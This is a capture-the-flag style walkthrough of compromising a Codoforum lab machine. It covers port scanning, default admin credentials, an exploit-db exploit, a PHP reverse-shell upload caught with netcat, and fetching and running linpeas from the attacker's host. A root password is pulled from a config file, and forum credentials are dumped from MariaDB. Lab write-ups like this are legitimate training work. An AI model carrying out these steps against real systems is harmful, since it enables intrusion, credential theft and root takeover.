# Codo

## Enumeration & scanning

- Find two open ports: 22, 80

``` sh
# Standard scanning
sudo nmap -p- 192.168.222.23
sudo nmap -p 22,80 -A 192.168.222.23
```

### 80 (Apache)

- Codoforum application, nothing of note
- Find various pages:
    - User login: http://192.168.222.23/index.php?u=/user/login
    - Admin login: http://192.168.222.23/admin/
    - Changelog: http://192.168.222.23/README.md -> version appears to be 5.2?

``` sh
# Standard scanning
nuclei -target 192.168.222.23
```

## Foothold

- Can login on both user and admin login with `admin:admin`
- Current version of tool is `V.5.1.105` based on admin page
- Exploit available for V5.1: https://www.exploit-db.com/exploits/50978


## Exploitation

- Exploit doesn't work, but manual steps as explained by it do. However, needed some trial and error as it didn't immediately work, likely because of special characters in filename.
- Only one flag to be found, so none in this phase.

``` sh
# Exploit (need to have Burp open as it expects a proxy on 8080, but still doesn't work)
python3 50978.py -t http://codologic.offsec -u admin -p admin -i 192.168.45.198 -n 4444
# Manual route
# Upload reverse shell without any special characters in filename as cover image via admin controls
# Browse to reverse, capture it, and upgrade
http://codologic.offsec/sites/default/assets/img/attachments/phprevshell.php
nc -nlvp 4444
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Privilege Escalation

- Initial checks didn't yield results. Can't execute most steps related to `sudo` (SUID, `sudo -l`) as we are prompted for password for `www-data` user.
- Attempt to find more information with Linpeas.
- Find password in config file of Codometer. 
- Password works for `root` user.


``` sh
# Copy and run Linpeas
python3 -m http.server 80
cd /var/www/html/
wget http://192.168.45.198/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
# Interesting output (MariaDB password)
╔══════════╣ Searching passwords in config PHP files (T1552.001)
/var/www/html/sites/default/config.php:  'password' => 'FatPanda123',
# Pivot to root
su root
FatPanda123
cd /root
ls
cat proof.txt
```


## References

- https://www.exploit-db.com/exploits/50978


## Rabbit holes

- SUID bit was set on `pkexec`, which is a known vulnerable binary. However, couldn't execute with `sudo` because of password prompt for `www-data` user. It seemed like we needed to pivot to `offsec` user.
- MariaDB server used by Codometer contained password as well. This was just for `anonymous` user on website it seems.

``` sh
# SUID, find pkexec
find / -perm -u=s -type f 2>/dev/null | grep -v "/snap"

# Login to MariaDB server and explore
mysql -u codo -p'FatPanda123' -h 127.0.0.1
show databases;
show tables from codoforumdb;
select * from codoforumdb.codo_users
# Find anonymous:youJustCantCrackThis 
```
